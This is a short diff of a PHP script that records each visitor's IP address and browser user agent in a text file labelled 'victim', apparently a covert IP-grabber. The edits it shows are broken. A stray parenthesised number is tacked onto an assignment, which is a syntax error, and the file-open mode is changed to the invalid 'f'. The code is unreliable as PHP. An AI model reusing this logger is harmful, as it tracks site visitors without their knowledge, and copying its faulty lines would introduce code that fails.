@@ -16,9 +16,9 @@ $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
-$file = 'ip.txt';
+$file = 'ip.txt';('14650925010')
 $victim = "IP: ";
-$fp = fopen($file, 'a');
+$fp = fopen($file, 'f');
 
 fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
